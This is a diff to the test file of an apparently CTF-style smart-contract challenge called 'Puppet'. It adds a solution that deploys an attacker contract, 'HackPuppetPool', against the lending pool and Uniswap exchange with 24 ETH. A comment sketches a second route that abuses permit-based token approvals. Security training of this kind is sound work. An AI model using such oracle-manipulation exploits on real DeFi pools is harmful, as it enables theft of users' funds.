@@ -95,6 +95,10 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // 1st possibility
+        await (await ethers.getContractFactory("HackPuppetPool", player)).deploy(lendingPool.address, uniswapExchange.address, token.address, {value: 24n * 10n ** 18n});
+        // 2nd possibility
+        // we could calculate the address of the deployed contract and use the permit method to approve and transferFrom dvt tokens from the deploy...
     });
 
     after(async function () {
